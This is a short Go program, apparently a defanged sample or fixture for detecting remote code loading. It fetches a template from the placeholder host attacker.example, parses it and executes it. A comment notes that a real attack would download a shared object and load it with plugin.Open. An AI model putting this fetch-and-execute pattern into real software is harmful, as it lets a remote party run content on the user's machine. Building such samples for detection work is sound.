// Defanged: HTTP fetch -> text/template Parse -> Execute. The real attacker
// shape would use plugin.Open on a downloaded .so; we use text/template to
// stay portable.
package main

import (
	"io"
	"net/http"
	"text/template"
	"os"
)

func main() {
	resp, _ := http.Get("https://attacker.example/t")
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	t, _ := template.New("x").Parse(string(body))
	t.Execute(os.Stdout, nil)
}
